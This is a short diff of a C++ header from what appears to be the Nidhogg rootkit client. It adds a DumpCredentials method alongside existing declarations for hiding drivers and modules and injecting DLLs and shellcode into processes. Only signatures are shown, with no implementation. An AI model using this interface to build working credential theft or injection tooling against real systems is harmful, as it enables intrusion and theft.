@@ -63,6 +63,7 @@ public:
 	RegistryQueryResult RegistryQueryHiddenValues();
 	NidhoggErrorCodes HideDriver(wchar_t* driverPath);
 	NidhoggErrorCodes UnhideDriver(wchar_t* driverPath);
+	std::vector<Credentials> DumpCredentials(DesKeyInformation* desKey, NidhoggErrorCodes* status);
 	NidhoggErrorCodes HideModule(DWORD pid, wchar_t* modulePath);
 	NidhoggErrorCodes InjectDll(DWORD pid, std::string dllPath, InjectionType injectionType);
 	NidhoggErrorCodes InjectShellcode(DWORD pid, PVOID shellcode, ULONG shellcodeSize, PVOID parameter1, PVOID parameter2, PVOID parameter3, InjectionType injectionType);
